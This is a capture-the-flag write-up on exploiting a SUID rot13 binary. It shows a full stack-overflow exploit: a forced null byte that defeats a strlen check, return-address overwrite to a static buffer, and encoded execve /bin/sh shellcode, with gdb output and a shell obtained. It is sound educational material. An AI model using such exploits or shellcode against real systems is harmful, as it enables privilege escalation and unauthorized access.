### Solved by superkojiman

We're provided access to a shell server where we find a SUID rot13 binary called rot13. As the name suggests, the binary will take input, ROT13 encode it, and then print out the result. We're also provided the code. If we look closely, we see that the ROT13 implementation is a bit weird.

Our input is encoded and decoded correctly provided that it consists only of letters in the alphabet. Once we throw in anything that isn't a letter, the binary will subtract 13 from it to encode it, and to decode it. That means it will never decode non-letters correctly. This will be important later on. 

The first step is to overwrite the saved return pointer. The server has ASLR turned on, but the binary has no stack canary and has an executable stack. Our input is stored in a global buffer called tmp. After the encoding is done, the contents of tmp are copied into buf and a check is made to see if the sum of the strlen of buf and tmp is greater than 255. If it is, the program reports that the buffer is full and prints the encoded message. Since tmp is a global buffer, it will have a static address. Since it contains our input, we can store our payload in there and bypass ASLR by returning to it. 

Here's the beginning of our exploit: 

```python
#!/usr/bin/env python

buf = ""
buf += "A"*254 + "\n"
buf += "B"*254 + "\n"
sys.stdout.write(buf)
```

Let's see how the program behaves. I modified the source code so that it would print the contents of the tmp buffer as well. 

```text
koji@pwnbox32:~/Desktop/rot13$ ./sploit.py | ./a.out 
ROT13-ATOR
Input strings. Send an empty newline to end.
Buffer is full, ending.
tmp: len:255 data:[OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
]
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
```

So it behaves as expected. Our "A"s have been converted to "N"s, and our "B"s to "O"s. Notice that only the "N"s have been printed out, and the "O"s have been left in the tmp buffer. However, there's still no overflow since we've entered more than 255 bytes. So how can we bypass the strlen checks?

If we look at the man page for strlen, it says that it reads up to the null byte to get the length of the string. Notice that a null byte is automatically appended in to our buffer whenever rotinput gets a "\n". However, it's possible to force our own null byte into the string. Recall that non-letters are encoded by subtracting 13 from it. So we just need to insert 0xd somewhere in our input which will cause it to be encoded into 0x00. 

```python
#!/usr/bin/env python

buf = "" 
buf += "A"*254 + "\n"   # write enough bytes to fill the buffer
buf += "\x0d"           # null terminate the string to fool strlen()
buf += "B"*300 + "\n"   # now we can overflow the buffer
sys.stdout.write(buf)
```

Test it out: 

```text
koji@pwnbox32:~/Desktop/rot13$ ./sploit.py | ./a.out 
ROT13-ATOR
Input strings. Send an empty newline to end.
Buffer is full, ending.
tmp: len:1 data:[
]
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

Segmentation fault (core dumped)
```

Nice, we crashed it! Let's see if we overwrote the saved return pointer: 

```
[----------------------------------registers-----------------------------------]
EAX: 0x100 
EBX: 0x4f4f4f4f ('OOOO')
ECX: 0xb7fc1b07 --> 0xfc28980a 
EDX: 0xb7fc2898 --> 0x0 
ESI: 0x0 
EDI: 0x4f4f4f4f ('OOOO')
EBP: 0x4f4f4f4f ('OOOO')
ESP: 0xbffff27c ('O' <repeats 200 times>...)
EIP: 0x8048799 (<main+332>: ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048796 <main+329>:    pop    ebx
   0x8048797 <main+330>:    pop    edi
   0x8048798 <main+331>:    pop    ebp
=> 0x8048799 <main+332>:    ret    
   0x804879a:   xchg   ax,ax
   0x804879c:   xchg   ax,ax
   0x804879e:   xchg   ax,ax
   0x80487a0 <__libc_csu_init>: push   ebp
[------------------------------------stack-------------------------------------]
0000| 0xbffff27c ('O' <repeats 200 times>...)
0004| 0xbffff280 ('O' <repeats 200 times>...)
```

Yep. So we're definitely returning to an address we control now. However, what happened to the contents of tmp? Before we inserted the null byte we had data in there, now we don't. It's because nothing is being left over there since we're only overwriting an extra 255 bytes. If we write 300 "B"s instead:

```
koji@pwnbox32:~/Desktop/rot13$ ./sploit.py | ./a.out 
ROT13-ATOR
Input strings. Send an empty newline to end.
Buffer is full, ending.
tmp: len:47 data:[OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
]
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

Segmentation fault (core dumped)
```

Perfect! We can store our shellcode in tmp and return to it. I'll be using a 21-byte exec "/bin/sh" [shellcode](http://shell-storm.org/shellcode/files/shellcode-841.php). So let's see what address it gets stored in by searching for our string of "O"s in gdb:

```
Breakpoint 1, 0x08048799 in main ()
gdb-peda$ find OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO
Searching for 'OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO' in: None ranges
Found 7 results, display max 7 items:
  a.out : 0x804a060 ('O' <repeats 46 times>, "\n")
[stack] : 0xbfffcc12 ('O' <repeats 46 times>, "\n]\n")
```

The address at a.out is what we want, since it'll be static. We'll need to encode the address first so that it gets decoded correctly by rotinput. Since the address consists of non-letters, we just need to add 13 to each byte. This gives us "\x6d\xad\x11\x15" With a bit of experimenting, we find the offset:

```python
#!/usr/bin/env python

buf = "" 
buf += "A"*254 + "\n"           # write enough bytes to fill the buffer
buf += "\x0d"                   # null terminate the string to fool strlen()
buf += "B"*12                   # padding to overwrite saved return pointer
buf += "\x6d\xad\x11\x15"       # address of our shellcode
buf += "C"*300 + "\n"
sys.stdout.write(buf)
```

In gdb, we see that main will return to our address which contains our payload of "P"s

```text
[----------------------------------registers-----------------------------------]
EAX: 0x100 
EBX: 0x4f4f4f4f ('OOOO')
ECX: 0xb7fc1b07 --> 0xfc28980a 
EDX: 0xb7fc2898 --> 0x0 
ESI: 0x0 
EDI: 0x4f4f4f4f ('OOOO')
EBP: 0x4f4f4f4f ('OOOO')
ESP: 0xbffff27c --> 0x804a07a ('P' <repeats 36 times>, "\n")
EIP: 0x8048799 (<main+332>: ret)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048796 <main+329>:    pop    ebx
   0x8048797 <main+330>:    pop    edi
   0x8048798 <main+331>:    pop    ebp
=> 0x8048799 <main+332>:    ret    
   0x804879a:   xchg   ax,ax
   0x804879c:   xchg   ax,ax
   0x804879e:   xchg   ax,ax
   0x80487a0 <__libc_csu_init>: push   ebp
[------------------------------------stack-------------------------------------]
0000| 0xbffff27c --> 0x804a07a ('P' <repeats 36 times>, "\n")
0004| 0xbffff280 ('P' <repeats 200 times>...)
0008| 0xbffff284 ('P' <repeats 200 times>...)
0012| 0xbffff288 ('P' <repeats 200 times>...)
0016| 0xbffff28c ('P' <repeats 200 times>...)
0020| 0xbffff290 ('P' <repeats 200 times>...)
0024| 0xbffff294 ('P' <repeats 200 times>...)
0028| 0xbffff298 ('P' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
```

Notice that it's returning to 0x804a07a instead of 0x804a060, which is what we originally wanted. This because our encoded address "\x6d\xad\x11\x15" contains 0x6d which is the letter "m". Therefore the rotinput function treats it as a letter and adds 13 to it instead of subtracting 13. No matter, we still fall in the vicinity of our payload. 

Now we need to encode our shellcode. Adding 13 to each byte should suffice:

```python
#!/usr/bin/env python 

sc = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
enc_sc = ""

for i in sc:
    c = int(ord(i))
    c += 13
    enc_sc += chr(c)
```

Now there's one problem here. Note that the 3rd byte in the shellcode is 0xf7. Add 13 to that and you get 0x104 which falls out of the range of ascii chars and will cause chr() to throw an exception. To get around this, we'll replace it with 0x4 since 0x4-0xd = 0xfffffff7, and the binary will only look at the least significant byte; 0xf7. So now we have:

```python
#!/usr/bin/env python 

sc = "\x31\xc9\x04\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
enc_sc = ""

for i in sc:
    c = int(ord(i))
    c += 13
    enc_sc += chr(c)

buf = ""
buf += "A"*254 + "\n"                          # write enough bytes to fill the buffer
buf += "\x0d"                                  # null terminate the string to fool strlen()
buf += "B"*12                                  # padding to overwrite saved return pointer
buf += "\x6d\xad\x11\x15" + "\n"               # location of our NOP sled and shellcode
buf += "\x9d"*30 + enc_sc + "C"*250 + "\n"     # NOP sled and shellcode
```

I padded the shellcode with a NOP sled (0x9d - 0xd = 0x90) so that main() returns relatively close to the shellcode. So does it work now? No! The shellcode executes but once it gets to the "int 80" instruction, it fails. Here's our shellcode:

```text
   0x804a07a <tmp+26>:  xor    ecx,ecx
   0x804a07c <tmp+28>:  add    al,0xe1
   0x804a07e <tmp+30>:  mov    al,0xb
   0x804a080 <tmp+32>:  push   ecx
   0x804a081 <tmp+33>:  push   0x68732f2f
   0x804a086 <tmp+38>:  push   0x6e69622f
   0x804a08b <tmp+43>:  mov    ebx,esp
   0x804a08d <tmp+45>:  int    0x80
```

Right when it executes, EAX has the value 0x100. After it executes tmp+30, we expect EAX to be 0xb (sys_execve), but instead it's 0x10b which is an invalid system call. 0x100 is 255 in decimal, so it's probably the return value of strlen when it calculates the length of our "A"s. 

Subtracting 1 from our string of "A"s and adding 1 to our string of "B"s will change EAX to 0xff so that "mov al,0xb" will set EAX to 0xb. Our final exploit: 

```python
#!/usr/bin/env python
import sys

sc = "\x31\xc9\x04\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
enc_sc = ""

for i in sc:
    c = int(ord(i))
    c += 13
    enc_sc += chr(c)

buf = "" 
buf += "A"*253 + "\n"                        # write enough bytes to fill the buffer
buf += "\x0d"                                # null terminate the string to fool strlen()
buf += "B"*13                                # padding to overwrite saved return pointer
buf += "\x6d\xad\x11\x15" + "\n"             # location of our NOP sled and shellcode
buf += "\x9d"*30 + enc_sc + "C"*250 + "\n"   # NOP sled and shellcode

sys.stdout.write(buf)
```

Let's try it on the server:

```text
a9895@tjctf-shell:~$ (./sploit.py ; cat) | /problems/rot13/rot13 
ROT13-ATOR
Input strings. Send an empty newline to end.
Buffer is full, ending.
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN

id
uid=1152(a9895) gid=1790(a9895) egid=1611(rot13) groups=1611(rot13),1640(ctfusers),1790(a9895)
cat /problems/rot13/flag
2ROT13be5tc1ph3r
```

After all that, we finally got the flag: 2ROT13be5tc1ph3r

